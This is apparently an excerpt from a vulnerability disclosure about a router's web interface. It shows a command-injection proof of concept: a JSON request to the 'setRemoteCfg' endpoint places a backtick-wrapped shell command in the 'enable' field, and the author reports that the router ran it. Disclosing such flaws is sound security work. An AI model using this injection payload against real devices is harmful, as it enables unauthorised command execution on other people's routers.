...
We set `enable` as **\`ls>./setRemoteCfg.txt\`** , and the router will execute it,such as:
...
{"topicurl":"setRemoteCfg","enable":"`ls>./setRemoteCfg.txt`"
}
```
...
After submitting the HTTP request, we observed that the txt file was successfully created, and its content was precisely the list of filenames from the folder. This confirms that the command `ls>./setRemoteCfg.txt` was executed successfully.
